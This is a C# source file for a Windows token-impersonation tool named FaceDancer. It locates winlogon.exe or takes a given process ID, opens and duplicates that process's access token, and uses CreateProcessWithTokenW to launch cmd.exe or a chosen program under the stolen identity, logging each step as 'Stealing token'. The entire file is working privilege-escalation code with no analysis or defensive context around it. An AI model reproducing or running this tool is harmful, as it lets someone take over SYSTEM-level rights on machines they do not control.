using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace FaceDancer
{
    class FaceDancer
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            ProcessAccessFlags processAccess,
            bool bInheritHandle,
            int processId
        );

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle,
            DesiredAccess desiredAccess, out IntPtr TokenHandle);

        [Flags]
        public enum DesiredAccess : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID),
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, IntPtr dwLogonFlags, 
            string lpApplicationName, string lpCommandLine, IntPtr dwCreationFlags, 
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref IntPtr lpStartupInfo, 
            out PROCESS_INFORMATION lpProcessInformation);

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {

            public IntPtr Sid;
            public int Attributes;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        static void Main(string[] args)
        {
            int procId;
            string file;

            if (args.Length < 2)
            {
                file = "C:\\Windows\\System32\\cmd.exe";
                if (args.Length == 0)
                {
                    // If we don't have a process ID as an argument, find winlogon.exe
                    procId = Process.GetProcessesByName("winlogon").First().Id;
                }
                else if (args[0].Contains('.'))
                {
                    procId = Process.GetProcessesByName("winlogon").First().Id;
                    if (args != null)
                    {
                        file = args[0];
                    }
                }
                else
                {
                    procId = Convert.ToInt32(args[0]);
                }
            }
            else
            {
                procId = Convert.ToInt32(args[0]);
                file = args[1];
            }

            IntPtr tokenHandle = IntPtr.Zero;
            IntPtr dupHandle = IntPtr.Zero;

            Console.WriteLine("Stealing token from PID " + procId);

            IntPtr procHandle = OpenProcess(ProcessAccessFlags.QueryInformation, true, procId);
            Console.WriteLine("Process handle: " + procHandle);

            bool procToken = OpenProcessToken(procHandle, DesiredAccess.TOKEN_DUPLICATE, out tokenHandle);
            Console.WriteLine("OpenProcessToken: " + procToken);

            bool duplicateToken = DuplicateTokenEx(tokenHandle, 0x10000000, IntPtr.Zero, 3, TOKEN_TYPE.TokenImpersonation, out dupHandle);
            Console.WriteLine("DuplicateTokenEx: " + duplicateToken);

            PROCESS_INFORMATION newProc = new PROCESS_INFORMATION();
            IntPtr startupInfo = IntPtr.Zero;
            bool createProcess = CreateProcessWithTokenW(dupHandle, IntPtr.Zero, file, "", IntPtr.Zero, IntPtr.Zero, "C:\\Temp", ref startupInfo, out newProc);
            Console.WriteLine("Started process with ID " + newProc.dwProcessId);
            Console.WriteLine("CreateProcess return code: " + createProcess);
            Console.WriteLine(Marshal.GetLastWin32Error());
        }
    }
}
